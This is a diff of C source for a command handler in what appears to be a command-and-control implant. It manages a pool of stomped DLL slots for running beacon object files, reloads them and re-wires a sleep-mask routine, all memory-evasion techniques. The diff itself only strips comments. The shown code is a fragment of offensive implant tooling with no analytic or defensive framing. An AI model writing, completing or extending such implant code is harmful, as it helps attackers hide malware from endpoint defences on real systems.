@@ -132,7 +132,6 @@ FUNC INT NaxCmdBofStomp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len,
         BYTE count = args[1];
         if ( count > BOF_STOMP_ASYNC_MAX ) count = BOF_STOMP_ASYNC_MAX;
 
-        /* Scan ahead to find trailing flags byte after all DLL entries */
         UINT32 scan = 2;
         for ( BYTE i = 0; i < count && scan + 4 <= args_len; i++ ) {
             UINT32 wl = NaxR32( args + scan ); scan += 4;
@@ -140,7 +139,6 @@ FUNC INT NaxCmdBofStomp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len,
         }
         BOOL unload = ( scan < args_len ) ? ( args[scan] & 0x01 ) : FALSE;
 
-        /* Clean up existing async DLLs */
         for ( BYTE i = 0; i < Nax->BofStompPool.AsyncCount; i++ ) {
             BOF_STOMP_SLOT* s = &Nax->BofStompPool.AsyncSlots[i];
             if ( s->DllBase && !s->InUse )
@@ -149,7 +147,6 @@ FUNC INT NaxCmdBofStomp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len,
         Nax->BofStompPool.AsyncCount = 0;
         Nax->Config.BofAsyncCount    = 0;
 
-        /* Load new set */
         UINT32 p = 2;
         BYTE loaded = 0;
         off = NaxAppendStr((PCHAR)out, off, cap, "async pool updated" );
@@ -202,7 +199,6 @@ FUNC INT NaxCmdBofStomp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len,
         WCHAR buf[64]; MmZero( buf, sizeof( buf ) );
         MmCopy( buf, name, nchars * sizeof( WCHAR ) );
 
-        /* Free current resident BOF before swapping the DLL */
         NaxBofFreeResident( Nax );
 
         BOOL ok = ReloadSlot( Nax, buf, &Nax->BofStompPool.SmSlot, unload );
@@ -215,7 +211,6 @@ FUNC INT NaxCmdBofStomp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len,
         off = NaxAppendWStr((PCHAR)out, off, cap, buf );
         off = NaxAppendStr((PCHAR)out, off, cap, unload ? " (old unloaded)" : " (old restored)" );
 
-        /* Re-wire sleepmask into the new slot from cached BOF bytes */
         if ( ok && Nax->SmBofCache && Nax->SmBofCacheLen > 0 ) {
             INT rc = NaxSleepmaskWire( Nax, Nax->SmBofCache, Nax->SmBofCacheLen );
             off = NaxAppendStr((PCHAR)out, off, cap, rc == NAX_OK ? "\nsleepmask re-wired OK" : "\nsleepmask re-wire FAILED" );
